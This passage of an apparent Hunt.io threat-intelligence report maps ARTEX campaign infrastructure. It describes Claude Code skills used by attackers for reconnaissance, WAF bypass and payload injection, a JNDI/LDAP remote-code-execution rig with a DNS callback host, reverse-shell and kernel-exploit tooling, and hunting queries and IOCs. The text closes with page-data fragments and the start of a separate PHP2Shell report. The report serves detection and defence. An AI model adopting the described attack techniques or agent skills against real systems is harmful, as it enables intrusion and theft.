for the agent. These skills provide a clear picture of the operation and the tasks the agent was designed to carry out.\n\n![Figure 11](https://public-hunt-static-blog-assets.s3.us-east-1.amazonaws.com/11-2026/ARTEX+Exposed+Mapping+the+Infrastructure+Behind+the+South+Korean+Bank+Breaches+-+figure+11.png)\n\n###### Figure 11. Usage counts for the 19 custom Claude Code skills, totaling 147 recorded invocations.\n\nThey provide an overview of the operation's main activities, from reconnaissance and application analysis to mobile device automation and payment testing.\n\n| Skill | Function |\n| --- | --- |\n| code-audit | Reviewing source code and application configurations |\n| recon | Enumerating targets and discovering assets |\n| web-inject | Injecting payloads into web application workflows |\n| hae | Enumerating web assets and identifying the attack surface |\n| cloud-phone | Managing rented Android cloud phone instances |\n| xingjie-cloudphone | Controlling Xingjie (星界) cloud phone services |\n| hemax-adb | Automating interactions with cloud phone instances through ADB |\n| js-api-mining | Extracting internal JavaScript API calls from target websites |\n| waf-bypass | Testing methods to bypass web application firewalls |\n| web-auth | Examining authentication flows and potential bypasses |\n| tg-miniapp | Testing Telegram Mini Apps |\n| apk-download | Downloading target Android APK files |\n| oversea-cloudphone | Provisioning overseas cloud phone instances |\n| b2-archive | Archiving evidence in Backblaze B2 |\n| decompile | Decompiling APK files and other binaries |\n| apk-internal-hunting | Searching decompiled APKs for internal endpoints and exposed secrets |\n| attack-variants | Generating variations of exploit payloads |\n| file-ssrf | Testing for server-side request forgery through file handling features |\n| payment-logic | Testing payment and cash-in business logic |\n\nThe payment-logic skill is particularly notable because a file named .secrets-cashin-test-accounts was found alongside it. The file contains three self-registered accounts with JWTs for a cash-in deposit API. A source comment describes the accounts as part of an authorized, self-built test dated September 12, 2026. Each account has its own user ID and bank account ID.\n\nThis setup is consistent with an approach to testing for insecure direct object reference (IDOR) vulnerabilities.\n\nGenians and CrowdStrike have described similar techniques in connection with attacks against Korean loan and inquiry services.\n\nReconnaissance Tooling and Staged RCE Exploitation\n--------------------------------------------------\n\nThe same directory contains the tools used to support reconnaissance, manage proxy infrastructure, and stage a remote code execution (RCE) chain.\n\n### FOFA Access Through a Third-Party API\n\n__fofa2.py__ is a Python client for FOFA, a Chinese cyberspace asset search engine commonly compared with Shodan and Censys. The script sends requests to the third-party service fofoapi.com. It constructs an HMAC-SHA256 signature, generates a timestamp and nonce, and submits search parameters through the service's __/api/v1/search/all__ endpoint.\n\nA comment in the source code states that the primary membership had expired and that a backup key was being used. This suggests that the operator had previously relied on a paid FOFA membership and had switched to an alternative access method.\n\n```bash\ndef nonce():\n    return hashlib.sha256(\n        (UA + \"1920x1080x24\" + \"zh-CN\" + SALT).encode()\n    ).hexdigest()[:32]\nurl = \"https://fofoapi.com/api/v1/search/all?\" +\n      urllib.parse.urlencode(params)\n### Tracking Proxy Enumeration and Exit-IP Tracking\n```\n\nThe scripts __proxypool.py__ and __proxypool_enum.py__ manage and enumerate a rotating proxy service exposed at 154.201.79[.]246:443. The service accepts credentials following the __Default.customerNNN__ naming pattern, allowing the operator to test multiple customer identities against the same endpoint.\n\nIt uses concurrent requests to identify exit IP addresses, retries failed probes, and maintains a persistent ledger linking identities to observed IP addresses and project assignments. The scripts also identify shared exit IPs and compare results across sampling rounds.\n\nThe initial sample reportedly contained __79 unique exit IP addresses__ among the first 100 identities tested. This demonstrates that the service can expose multiple exit IPs through a single proxy endpoint.\n\n![Figure 12](https://public-hunt-static-blog-assets.s3.us-east-1.amazonaws.com/11-2026/ARTEX+Exposed+Mapping+the+Infrastructure+Behind+the+South+Korean+Bank+Breaches+-+figure+12.png)\n\n###### Figure 12. Summary of 79 Exit IP addresses mapped to ten geo-located countries, with the US leading the count.\n\nThe address 154.201.79[.]246 is also identified as a proxy-related indicator in reporting by __CrowdStrike__, __ThreatBook__, and __Cybersecurity News__.\n\n### JNDI/LDAP Exploitation Infrastructure\n\nAnother open directory at [23.248.226[.]250:8001](https://portal.hunt.io/attackcapture/filemanager?host=http://x.x.x.x:8001) holds a small, self-contained JNDI and LDAP exploitation rig built on the UnboundID LDAP SDK. According to the associated logs, the chain was staged and retrieved on __October 5, 2026, at 03:42 UTC__.\n\n![Figure 13](https://public-hunt-static-blog-assets.s3.us-east-1.amazonaws.com/11-2026/ARTEX+Exposed+Mapping+the+Infrastructure+Behind+the+South+Korean+Bank+Breaches+-+figure+13.png)\n\n###### Figure 13. DNS-based out-of-band confirmation of remote code execution through a JNDI lookup, from the target application to the rogue LDAP server, hosted exploit class, shell command execution, and DNS callback.\n\nThe __LDAPRefServer.java__ and __LDAP2.java__ create an in-memory LDAP directory server that returns specially crafted Java naming references in response to search requests. The server modifies search results to include a __javaNamingReference__ object with attributes specifying a Java class name, a codebase URL, and a factory class. In __LDAP2.java__, these attributes point to the Exploit class hosted at the same external address.\n\n![Figure 14](https://public-hunt-static-blog-assets.s3.us-east-1.amazonaws.com/11-2026/ARTEX+Exposed+Mapping+the+Infrastructure+Behind+the+South+Korean+Bank+Breaches+-+figure+14.png)\n\n###### Figure 14. LDAP search result manipulation and Java naming reference construction in LDAP2.java.\n\nThe supplied __Exploit.class__ provides further evidence of the intended execution chain. Its static initializer invokes system commands, including id, hostname, and uname -a, and also attempts to read /etc/hostname. The resulting output is sanitized before being incorporated into a DNSLog callback hostname under __u6ud2s.dnslog.cn__.\n\nThis mechanism is designed to confirm command execution through an out-of-band DNS interaction. The compiled class also contains references to HTTP-based retrieval commands, indicating an alternative mechanism for transmitting data.\n\nThe accompanying __mux.py__ script provides a single entry point for HTTP and LDAP traffic. It inspects the first bytes of each incoming connection and forwards HTTP-like requests to a local service on port 8000, while routing other connections to the LDAP service on port 1389. This arrangement allows the two services to share one listening port, provided the traffic can be classified by its initial bytes.\n\nRecovered Tooling and Payloads: Exchange Access and Mobile Device Operations\n----------------------------------------------------------------------------\n\nThe files recovered from 38.244.50[.]120:8000 and from 23.248.226[.]250:8907 contained a diverse collection of scripts, binaries, source files, and configuration artifacts associated with cryptocurrency-exchange access, Linux exploitation, and mobile-device operations.\n\nThe following table summarizes the recovered artifacts and their observed or apparent functions.\n\n| Artifact | Observed functionality or contents |\n| --- | --- |\n| x.js | Checks for an authenticated YIIMP administrator session, tests default credentials, and includes functionality associated with initiating withdrawals. |\n| x.sh | Supports reverse-shell access, collects configuration and key files, and scans local ports associated with cryptocurrency-wallet RPC services. |\n| relay.py | Provides a listener on port 4444. |\n| server.py | Provides a service on port `8000 associated with payload handling and data collection. |\n| tg.py | Implements Telegram-based notifications. |\n| tg.conf | Contains Telegram bot and chat configuration fields, with sensitive values redacted. |\n| shells.log | Stores shell-related log entries. |\n| BlocPalX files | Recovered files associated with the BlocPalX cryptocurrency platform. |\n| les.sh | Linux exploit suggester script. |\n| Poc2588\u003Cbr>Exp2588\u003Cbr>exp2588_44 | Exploit or proof-of-concept builds associated with CVE-2022-2588. |\n| cve5054-static\u003Cbr>cve5054 variants,\u003Cbr>including v2/v3 \u003Cbr>musl builds | Multiple binaries associated with CVE-2025-5054, including statically linked or alternative-library builds. |\n| cv3p, cvx \u003Cbr>cve3493-static | Additional exploit-related binaries whose precise CVE associations or functions remain unconfirmed. |\n| aio_uaf.c | iOS exploit-related source code referencing a use-after-free technique. |\n| poc65343_probe.c | iOS proof-of-concept or probing source associated with identifier 65343. |\n| ios26_probe.c | Probe source associated with iOS 26. |\n| stub.c, stub65343.c | Supporting C source files associated with the mobile proof-of-concept artifacts. |\n| Android KernelPatch tools | Utilities associated with Android kernel patching. |\n| payload-dumper-go.exe | Utility for extracting payload contents from Android firmware packages. |\n| Patched EDL firmware files | Modified firmware artifacts associated with Emergency Download Mode workflows. |\n| recv.py | Receives data on port 8082. |\n| wxapkg-watchdog.sh.__rev2 | Watchdog script associated with a WeChat mini-program package. |\n| cloudphone-oversea.key | Credential or key file associated with overseas cloud-phone operations. |\n\nThe recovered artifacts fall into two broad operational areas. The __first__ concerns cryptocurrency-exchange access and web application workflows, including administrator-session checks, withdrawal functionality, shell access, and collection of configuration files. The __second__ concerns Linux exploitation and mobile-device research, including kernel exploit builds, iOS proof-of-concept source files, Android firmware utilities, and cloud-phone tooling.\n\nHunting ARTEX Infrastructure with Hunt.io\n-----------------------------------------\n\nFour open directories provided two initial indicators: the ARTEX console host and its Hong Kong jump host. Using these indicators, Hunt.io SQL enables __three__ primary hunting approaches based on certificate metadata, malware classification, and HTTP page titles.\n\nThe queries below were executed against Hunt.io during this analysis. Each query is reproduced as written, alongside its reported results and the evidence it provides.\n\nHunt.io supports three complementary approaches to hunting ARTEX infrastructure:\n\n1.  __Certificate pivot__: Search for the ARTEX issuer organization to identify hosts exposing the matching TLS certificate.\n\n2.  __Malware classification__: Query malware.name for ARTEX to obtain a broader set of candidate IP addresses.\n\n3.  __HTTP title matching__: Search for the exact console title, then expand the search to identify translated and modified title variants.\n\n### Certificate-Based Infrastructure Hunting\n\nThe ARTEX console at [38.244.50[.]120](https://portal.hunt.io/ip/x.x.x.x/ssl-history) presented a TLS certificate with ARTEX as its issuer organization. Hunt.io's SSL history records the certificate with the following SHA-256 fingerprint:\n\n```C7A884AFCD7F91408921890D9617BEF6BFAC3DAE992BC25BB9C48C0395A60842```\n\nThe certificate's subject common name is 38.244.50.120. Its recorded validity period runs from September 25, 2026, to September 22, 2036.\n\n![Figure 15](https://public-hunt-static-blog-assets.s3.us-east-1.amazonaws.com/11-2026/ARTEX+Exposed+Mapping+the+Infrastructure+Behind+the+South+Korean+Bank+Breaches+-+figure+15.png)\n\n###### Figure 15. Hunt.io SSL history for x.x.x.x, showing the ARTEX-issued certificate on port 443 and its SHA-256 fingerprint, providing a certificate-based indicator for hunting related infrastructure.\n\nThe issuer organization provides a useful search pivot because it is a specific, distinctive string. Searching for this value can identify hosts that retain the same certificate configuration.\n\n__SQL query__:\n\n```huntsql\nSELECT\n  ip\nFROM\n  certificates\nWHERE\n  issuer.organization = 'ARTEX'\n  AND timestamp gt '2026-01-01'\nGROUP BY\n  ip\n```\n\n![Figure 16](https://public-hunt-static-blog-assets.s3.us-east-1.amazonaws.com/11-2026/ARTEX+Exposed+Mapping+the+Infrastructure+Behind+the+South+Korean+Bank+Breaches+-+figure+16.png)\n\n###### Figure 16. Hunt.io SSL history showing the ARTEX issuer organization and associated certificate fingerprint.\n\nThe [result](https://portal.hunt.io/sql?sql=SELECT%0A++ip%0AFROM%0A++certificates%0AWHERE%0A++issuer.organization+%3D+%27ARTEX%27%0A++AND+timestamp+gt+%272026-01-01%27%0AGROUP+BY%0A++ip&run=true&page=0&size=25&sizeWasCapped=false&hl=true&ec=true&tf=30&hasExplicitTimeframe=false&tab=results) returned 19 distinct IP addresses, including 38.244.50[.]120. This method is precise but limited to hosts that expose a matching certificate. Systems using a different certificate will not appear in these results.\n\n### Hunting ARTEX Through Malware Classification\n\nARTEX infrastructure through the malware.name field. Searching this classification provides broader coverage than the certificate pivot because it does not require the host to retain the same certificate.\n\n__SQL query__:\n\n```huntsql\nSELECT\n  ip\nFROM\n  malware\nWHERE\n  malware.name == 'ARTEX'\n  AND timestamp gt '2026-01-01'\nGROUP BY\n  ip\n```\n\n![Figure 17](https://public-hunt-static-blog-assets.s3.us-east-1.amazonaws.com/11-2026/ARTEX+Exposed+Mapping+the+Infrastructure+Behind+the+South+Korean+Bank+Breaches+-+figure+17.png)\n\n###### Figure 17. Hunt.io SQL results for the malware family tag pivot, showing the distinct host count for infrastructure tagged ARTEX.\n\nThe [result](https://portal.hunt.io/sql?sql=SELECT%0A++ip%0AFROM%0A++malware%0AWHERE%0A++malware.name+%3D%3D+%27ARTEX%27%0A++AND+timestamp+gt+%272026-01-01%27%0AGROUP+BY%0A++ip&run=true&page=0&size=25&sizeWasCapped=false&hl=true&ec=true&tf=30&hasExplicitTimeframe=false&tab=results) returned 1,303 distinct IP addresses. The difference demonstrates the broader coverage of Hunt.io's ARTEX classification compared with a single certificate attribute.\n\n#### Geographic Distribution of ARTEX-Tagged IP Addresses\n\nWe have performed an aggregation to find a view of the geographic distribution of ARTEX-tagged IP addresses.\n\n__SQL query__:\n\n```huntsql\nSELECT\n  asn.country_code, uniq(ip) as hits\nFROM\n  malware\nWHERE\n  malware.name == 'ARTEX'\n  AND timestamp gt '2026-01-01'\nGROUP BY\n  asn.country_code\nORDER BY\n  hits DESC\n```\n\n![Figure 18](https://public-hunt-static-blog-assets.s3.us-east-1.amazonaws.com/11-2026/ARTEX+Exposed+Mapping+the+Infrastructure+Behind+the+South+Korean+Bank+Breaches+-+figure+18.png)\n\n###### Figure 18. Country distribution of ARTEX tagged infrastructure, aggregated from the Method 2 dataset.\n\nThe [result](https://portal.hunt.io/sql?sql=SELECT%0A++asn.country_code%2C+uniq%28ip%29+as+hits%0AFROM%0A++malware%0AWHERE%0A++malware.name+%3D%3D+%27ARTEX%27%0A++AND+timestamp+gt+%272026-01-01%27%0AGROUP+BY%0A++asn.country_code%0AORDER+BY%0A++hits+DESC&run=true&page=0&size=25&sizeWasCapped=false&hl=true&ec=true&tf=30&hasExplicitTimeframe=false&tab=results) shows 30 different countries having ARTEX infrastructure. The United States accounts for the largest number of IP addresses, followed by China and Hong Kong. These figures describe the country attribution of the observed IP addresses, not necessarily the physical location of the operator.\n\n![Figure 19](https://public-hunt-static-blog-assets.s3.us-east-1.amazonaws.com/11-2026/ARTEX+Exposed+Mapping+the+Infrastructure+Behind+the+South+Korean+Bank+Breaches+-+figure+19.png)\n\n###### Figure 19. Geographic distribution of ARTEX-tagged IP addresses across the leading countries.\n\n__HTTP Title-Based Infrastructure Hunting__\n\nThe ARTEX login page provides another fingerprint through its HTML document title. \n\nThe console observed at 38.244.50[.]120 uses the following title:\n\n```ARTEX - 自主渗透测试控制台```\n\nThis title matches the banner reported by Genians and provides a direct string for searching HTTP observations in Hunt.io.\n\n__SQL query__:\n\n```huntsql\nSELECT\n  ip\nFROM\n  http\nWHERE\n  html.head.title == 'ARTEX --- 自主渗透测试控制台'\n  AND timestamp gt '2026-01-01'\nGROUP BY\n  ip\n```\n\n![Figure 20](https://public-hunt-static-blog-assets.s3.us-east-1.amazonaws.com/11-2026/ARTEX+Exposed+Mapping+the+Infrastructure+Behind+the+South+Korean+Bank+Breaches+-+figure+20.png)\n\n###### Figure 20. HuntSQL query to find ARTEX webpages having title \"ARTEX - 自主渗透测试控制台\"\n\nThe [result](https://portal.hunt.io/sql?sql=SELECT%0A++ip%0AFROM%0A++http%0AWHERE%0A++html.head.title+%3D%3D+%27ARTEX+%E2%80%94+%E8%87%AA%E4%B8%BB%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%8E%A7%E5%88%B6%E5%8F%B0%27%0A++AND+timestamp+gt+%272026-01-01%27%0AGROUP+BY%0A++ip&run=true&page=0&size=25&sizeWasCapped=false&hl=true&ec=true&tf=30&hasExplicitTimeframe=false&tab=results) returned approximately 1,300 unique IP addresses. It suggests that the title-based search has broad coverage in the observed dataset.\n\n### Expanding the Search to Localized Title Variants\n\nA further search can identify additional console instances that use translated or slightly modified titles.\n\n__SQL query__:\n\n```huntsql\nSELECT\n  html.head.title\nFROM\n  http\nWHERE\n  html.head.title LIKE '%ARTEX%'\n  AND (\n    html.head.title LIKE '%--- %'\n    OR html.head.title LIKE '%: %'\n  )\n  AND timestamp gt '2026-01-01'\nGROUP BY\n  html.head.title\n```\n\n![Figure 21](https://public-hunt-static-blog-assets.s3.us-east-1.amazonaws.com/11-2026/ARTEX+Exposed+Mapping+the+Infrastructure+Behind+the+South+Korean+Bank+Breaches+-+figure+21.png)\n\n###### Figure 21. Hunt.io HTTP title search results for ARTEX, showing matching console titles used to identify potentially related infrastructure across different language variants.\n\nThe [result](https://portal.hunt.io/sql?sql=SELECT%0A++html.head.title%0AFROM%0A++http%0AWHERE%0A++html.head.title+LIKE+%27%25ARTEX%25%27+AND+%28html.head.title+LIKE+%27%25%E2%80%94+%25%27+OR+html.head.title+LIKE+%27%25%3A+%25%27%29%0A++AND+timestamp+gt+%272026-01-01%27%0AGROUP+BY%0A++html.head.title&run=true&page=0&size=25&sizeWasCapped=false&hl=true&ec=true&tf=30&hasExplicitTimeframe=false&tab=results) returned 21 distinct title strings, of which 19 were identified as potentially relevant ARTEX console variants during the analysis.\n\nThe returned titles include English, Chinese, Korean, Japanese, Russian, Portuguese, and Vietnamese variants.\n\n| Observed title | Language or variant |\n| --- | --- |\n| ARTEX - 自主渗透测试控制台 | Chinese |\n| ARTEX - Autonomous security assessment console | English |\n| ARTEX: Autonomous Penetration Testing Console | English |\n| ARTEX - Console de Teste de Penetração Autônomo | Portuguese |\n| ARTEX - 자율  침투  테스트  콘솔 | Korean |\n| ARTEX - 自律型ペネトレーションテスト管理画面 | Japanese |\n| ARTEX - консоль автономного пентеста | Russian |\n| ARTEX - Bảng điều khiển kiểm thử xâm nhập tự động | Vietnamese |\n\nHunting ARTEX Open Directories via AttackCapture\n------------------------------------------------\n\nThe certificate, malware classification, and HTTP title pivots discussed above help identify ARTEX infrastructure at a broad level. An additional pivot through [AttackCapture's malware name search](https://hunt.io/features/attackcapture) helps narrow the results to systems where ARTEX operators may have exposed working files and supporting tools.\n\n![Figure 22](https://public-hunt-static-blog-assets.s3.us-east-1.amazonaws.com/11-2026/ARTEX+Exposed+Mapping+the+Infrastructure+Behind+the+South+Korean+Bank+Breaches+-+figure+22.png)\n\n###### Figure 22. AttackCapture Search Procedure for Identifying ARTEX-Linked Open Directories.\n\nThe search returns[  280 results](https://portal.hunt.io/attackcapture/search-result?query=ARTEX&query_type=malware_name) covering the ARTEX panel itself, other exposed services hosted on the same systems, and open directories that AttackCapture has independently flagged as malicious.\n \n![Figure 23](https://public-hunt-static-blog-assets.s3.us-east-1.amazonaws.com/11-2026/ARTEX+Exposed+Mapping+the+Infrastructure+Behind+the+South+Korean+Bank+Breaches+-+figure+23.jpg)\n\n###### Figure 23. AttackCapture search results for Malware Name = ARTEX, showing 280 results having open directories.\n\nConsider the following example to illustrate how AttackCapture can be used to identify and investigate ARTEX-associated infrastructure.\n\n### Validating an Individual Result\n\nOne of the results, __http://130.94.31[.]86:18888__, reveals a small open directory containing two files, agt.py and agt4.py, with a combined size of 4.05 KB. [AttackCapture's File Manager](https://portal.hunt.io/attackcapture/filemanager?host=http://x.x.x.x:18888) classifies both files as malicious.\n\n![Figure 24](https://public-hunt-static-blog-assets.s3.us-east-1.amazonaws.com/11-2026/ARTEX+Exposed+Mapping+the+Infrastructure+Behind+the+South+Korean+Bank+Breaches+-+figure+24.jpg)\n\n###### Figure 24. AttackCapture File Manager showing the exposed files at x.x.x.x:18888\n\nThe [host profile](https://portal.hunt.io/ip/x.x.x.x) strengthens this correlation by identifying __ARTEX__ as the active malware and displaying a standing warning for a __Potential Malicious Open Directory__. The system is associated with LIGHT NODE LIMITED (AS154177), located in Seoul, South Korea.\n\n![Figure 25](https://public-hunt-static-blog-assets.s3.us-east-1.amazonaws.com/11-2026/ARTEX+Exposed+Mapping+the+Infrastructure+Behind+the+South+Korean+Bank+Breaches+-+figure+25.jpg)\n\n###### Figure 25. IP profile for 130.94.31[.]86 showing Active Malware: ARTEX and the Potential Malicious Open Directory warning\n\nA port scan of the same IP address provides additional context. The ARTEX panel operates on port 8787, with the HTML title ARTEX - 自主渗透测试控制台, while the open directory is accessible through the separate port 18888.\n\n![Figure 26](https://public-hunt-static-blog-assets.s3.us-east-1.amazonaws.com/11-2026/ARTEX+Exposed+Mapping+the+Infrastructure+Behind+the+South+Korean+Bank+Breaches+-+figure+26.jpg)\n\n###### Figure 26. The IP address 130.94.31[.]86 shows two ports having ARTEX labels that validate our hunt.\n\nThe second example reveals an SMB reconnaissance and lateral movement toolkit whose own filenames contain an explicit reference to ARTEX.\n\nThe IP address [156.251.11[.]39](https://portal.hunt.io/ip/x.x.x.x) belongs to the network associated with __Tcloudnet (AS399077)__, within the IP range x.x.x.x/24, and is geolocated to Hong Kong. Our platform flags the host as high risk, identifying __ARTEX__ as active malware and recording three warnings for potentially malicious open directories on ports 18080, 18084, and 18443. Port 8787 serves the ARTEX panel, identified by the HTML title ARTEX - 自主渗透测试控制台.\n\n![Figure 27](https://public-hunt-static-blog-assets.s3.us-east-1.amazonaws.com/11-2026/ARTEX+Exposed+Mapping+the+Infrastructure+Behind+the+South+Korean+Bank+Breaches+-+figure+27.jpg)\n\n###### Figure 27. IP profile for x.x.x.x showing Active Malware: ARTEX and the Potential Malicious Open Directory warning\n\nThe [open directory](https://portal.hunt.io/attackcapture/filemanager?host=http://x.x.x.x:18080) contains an __Impacket__-based toolkit focused on SMB and printer RPC reconnaissance, credential-based authentication, and potential lateral movement. The exposed scripts include __smbls.py__, __splenum.py__, __winregread.py__, __and winrm_ntlm.py__. The scripts use hardcoded NTLM hashes and a machine account named __ITS-RENDER-01$__ to authenticate to internal hosts and enumerate network shares, printers, and registry keys.\n\n![Figure 28](https://public-hunt-static-blog-assets.s3.us-east-1.amazonaws.com/11-2026/ARTEX+Exposed+Mapping+the+Infrastructure+Behind+the+South+Korean+Bank+Breaches+-+figure+28.jpg)\n\n###### Figure 28. AttackCapture File Manager showing the 36 exposed files at 156.251.11[.]39:18080.\n\nThe strongest link between the exposed toolkit and the ARTEX name appears in __wtest.py__. It uses impacket to connect to SMB on hardcoded IPs/ports. Uses machine account ITS-RENDER-01$ with provided LM/NTHash to connect, write '__artex_probe_11876.txt__' to the print$ share, then attempts deletion.\n\n![Figure 29](https://public-hunt-static-blog-assets.s3.us-east-1.amazonaws.com/11-2026/ARTEX+Exposed+Mapping+the+Infrastructure+Behind+the+South+Korean+Bank+Breaches+-+figure+29.jpg)\n\n###### Figure 29. File analysis of wtest.py showing the artex_probe_11876.txt marker.\n\nThis example extends the investigation beyond a correlation based on malware classification and service fingerprints. The host exposes an ARTEX-identified panel and a separate directory containing SMB reconnaissance tooling. The artex_probe_11876.txt filename provides an additional, direct textual association with ARTEX.\n\nOther notable examples where Artex is found are below:\n\n| Host | Exposed content and observed capabilities | MITRE ATT&CK techniques |\n| --- | --- | --- |\n| 202.95.14[.]60:18090 | A DedeCMS and FangCMS mass exploitation toolkit containing Python scripts targeting administrative upload endpoints, harvested session cookies, a Godzilla webshell generator that produces AES, Base64, and XOR obfuscated PHP stagers, and SOCKS5 proxy automation. | T1190, T1105, T1078, T1027, T1505.003 |\n| 156.251.11[.]39:18080 | An internal post-exploitation toolkit containing multithreaded port scanners, Impacket-based SMB enumeration with hardcoded NTLM hashes for pass-the-hash authentication, and Chisel reverse tunnels mapping public ports to internal SMB, RDP, and WinRM services. The directory also contains a WebSocket command-and-control client. | T1046, T1550.002, T1021.002, T1572, T1090 |\n| 118.107.47[.]11:9999 | A CAPTCHA bypass automation suite using Selenium and image processing libraries such as PIL and NumPy to solve GeeTest slider challenges. Additional components include a local proxy that strips or injects headers, AES cryptographic utilities, HTTP and SOCKS5 proxy lists, and a WinRM credential spraying script. | T1110, T1021.003, T1090, T1027, T1059.006 |\n| 212.129.221[.]26:8080 | An exploitation toolkit targeting a RuoYi or Spring administrative console. The scripts read an administrator token from /opt/artex/.../admin_tokens.json, upload malicious Spring beans XML, and abuse the scheduled job API to execute shell commands through ProcessBuilder. | T1190, T1078, T1053, T1059, T1041 |\n| 149.88.85[.]20:8899 | CAPTCHA and OCR based login automation, AES and RSA encrypted credential payloads, a harvested administrator JWT, and scripts that create or delete accounts through an administrative API to initiate an internal WebSocket pivot. | T1078, T1110, T1098, T1027, T1046 |\n\nIn this way, an AttackCapture's malware name search provides a useful pivot from identifying ARTEX infrastructure to examining potentially exposed operational artifacts.\n\nMitigation and Defensive Recommendations\n----------------------------------------\n\nThe findings highlight risks associated with exposed administrative services, reusable credentials, remote access tunnels, proxy infrastructure, and exploitation tooling.\n\n1.  Remove unnecessary public access and restrict required administrative access through approved VPNs, allowlists, or dedicated management networks.\n\n1.  Reset SSH passwords and rotate API keys, proxy credentials, service tokens, and other secrets that may have been accessible through exposed files.\n\n1.  Patch internet-facing services, validate authentication and authorization controls, and restrict sensitive administrative functions.\n\n1.  Monitor for unexpected LDAP and JNDI activity, anomalous DNS callbacks, remote script downloads, unusual process execution, and unexplained outbound connections.\n\n1.  Enforce least-privilege file permissions and use a managed secrets store for credentials required by applications.\n\n1.  Restrict access to model gateways, protect their credentials, and monitor requests for unexpected destinations, unauthorized model endpoints, and suspicious automation.\n\n1.  For managed Android and iOS environments, enforce device compliance policies, trusted firmware requirements, application controls, and monitoring for unauthorized rooting, bootloader modification, or jailbreak activity.\n\nMITRE ATT&CK Matrix\n-------------------\n\n| Tactic | Technique | ID |\n| --- | --- | --- |\n| Reconnaissance | Active Scanning | T1595 |\n| Initial Access | Exploit Public-Facing Application | T1190 |\n| Execution | Command and Scripting Interpreter | T1059 |\n| Persistence | Scheduled Task/Job | T1053 |\n| Credential Access | Unsecured Credentials: Credentials in Files | T1552.001 |\n| Lateral Movement | Remote Services: SSH | T1021.004 |\n| Command and Control | Proxy | T1090 |\n| Command and Control | Ingress Tool Transfer | T1105 |\n| Collection | Data from Local System | T1005 |\n| Exfiltration | Exfiltration Over Web Service | T1567 |\n| Privilege Escalation | Exploitation for Privilege Escalation | T1068 |\n\nIndicator of Compromise (IOC) table\n-----------------------------------\n\n| Indicator | Type | Context |\n| --- | --- | --- |\n| 38.244.50[.]120 | IPv4 address | ARTEX console host and SSH tunnel destination referenced in recovered configuration |\n| 23.248.226[.]250 | IPv4 address | Hong Kong jump host with exposed directories and supporting tooling |\n| 154.201.79[.]246 | IPv4 address | Proxy service used by proxy enumeration scripts; also reported by external sources cited in the draft |\n| xcai[.]pro | Domain | AI service reseller domain associated with the reported campaign |\n| direct[.]xcai[.]pro | Domain | Endpoint referenced in the model-routing configuration |\n| fofoapi[.]com | Domain | Third-party API endpoint used by the recovered FOFA client |\n| u6ud2s[.]dnslog[.]cn | Domain | DNS callback hostname referenced by the staged exploitation artifact |\n| x.x.x.x:8000 | IP and port | Exposed directory containing scripts and supporting files |\n| x.x.x.x:18099 | IP and port | Exposed directory containing 42 files across two subdirectories |\n| x.x.x.x:8001 | IP and port | Directory hosting the JNDI/LDAP exploitation setup |\n| C7A884AFCD7F91408921890D9617\u003Cbr>BEF6BFAC3DAE992BC25BB9C48C0395A60842 | SHA-256 certificate fingerprint | TLS certificate associated with 38.244.50[.]120, with issuer organization ARTEX |\n| ARTEX - 自主渗透测试控制台 | HTTP title | Observed ARTEX console title used for Hunt.io searches |\n\nConclusion\n----------\n\nThe investigation expands the ARTEX campaign view beyond its publicly reported infrastructure. Analysis of exposed directories associated with 38.244.50[.]120 and 23.248.226[.]250 uncovered AI model-routing components, remote access scripts, proxy management utilities, exploitation tooling, and mobile-device utilities. These artifacts indicate a broader operational environment supporting reconnaissance, exploitation, and infrastructure management.\n\nHunt.io queries provided additional leads through certificate metadata, malware classification, and HTTP title matching. The malware classification query returned 1,303 distinct IP addresses, while certificate and title searches offered complementary methods for identifying potentially related hosts.\n\nThese findings show the value of combining infrastructure intelligence with exposed-file analysis and source-code inspection. This approach helps investigators move beyond isolated indicators, identify relationships between operational components, and develop more targeted detection and response measures. Further validation against independent telemetry and threat intelligence will be necessary to establish the full scope of the infrastructure and its relationship to the reported activity.",{"type":6,"value":81},"artex-south-korea-bank-infrastructure",{"type":6,"value":83},"ok0Sjeh_d",{"EElOb1aRp":85,"qMHRxmf0b":87,"FAm_Miq7W":89,"N4qNADKNH":93,"de1R1GSeH":95,"ei2alncPv":97,"iDOu5XxRP":99,"id":101},{"type":6,"value":86},"PHP2Shell One Week Later: Honeypot Shells on the Web, a Path to Root on Palo Alto Firewalls",{"type":6,"value":88},"One week after php2shell was patched, it stalls on the open web but reliably roots internet-facing Palo Alto PAN-OS firewalls. Inside the operators and the evidence.",{"type":20,"value":90},{"src":91,"srcSet":92,"pixelWidth":51,"pixelHeight":24,"alt":86},"https://framerusercontent.com/images/g4qsCfUVqvDfhMjE6fln8kiOTqc.png?width=961&height=540","https://framerusercontent.com/images/g4qsCfUVqvDfhMjE6fln8kiOTqc.png?scale-down-to=512&width=961&height=540 512w,https://framerusercontent.com/images/g4qsCfUVqvDfhMjE6fln8kiOTqc.png?width=961&height=540 961w",{"type":31,"value":94},[54],{"type":17,"value":96},"2026-10-30T00:00:00.000Z",{"type":6,"value":98},"PHP2Shell emerged from two critical PHP memory-safety vulnerabilities, [CVE-2026-109618](https://portal.hunt.io/vulnerability/cve/CVE-2026-109618) and [CVE-2026-109619](https://portal.hunt.io/vulnerability/cve/CVE-2026-109619), rated CVSS 4.0 9.2 and patched on October 21, 2026. The flaws affect how PHP handles session uploads and out-of-memory conditions, creating a path to remote code execution under vulnerable configurations. \n\nWe already covered the exposure side on 2026-10-22, [mapping roughly 3.19 million internet-facing PHP hosts and the first open directories](https://hunt.io/blog/php2shell-cve-2026-109618-109619-open-directories) staging php2shell tooling. This report goes the other way. We take the public exploitation reports from watchTowr, 0x4D31, GreyNoise, Wiz, and CrowdStrike and pivot back into our [AttackCapture™](https://hunt.io/features/attackcapture) open-directory data to see who is running this, how operators are adapting it, and how far it has really gone. We separate confirmed php2shell compromise from tooling, attempted attacks, and compromises that turned out to use a different bug.\n\nOur continued AttackCapture™ investigation identified additional exploit infrastructure, including a host at 130.94.67[.]235 (IP previously undisclosed) serving a proof of concept that repackages the PHP exploit chain for PAN-OS. Separately, [Dream Research](https://dreamgroup.com/blog/chained-php2shell-exploit-roots-25-servers) reported a campaign in which attackers chained PHP2Shell with the Fragnesia Linux kernel privilege-escalation vulnerability (CVE-2026-46300) to obtain root access on 25 servers. Unit 42 subsequently reported that it [verified](https://unit42.paloaltonetworks.com/cve-2026-109618-cve-2026-109619/) the same attacker's tooling and the reported results. \n\nKey findings\n------------\n\n-   Our open-directory hunt uncovered 616 PHP2Shell-related files, revealing a broad ecosystem of exploit development and staging infrastructure.\n\n-   We found 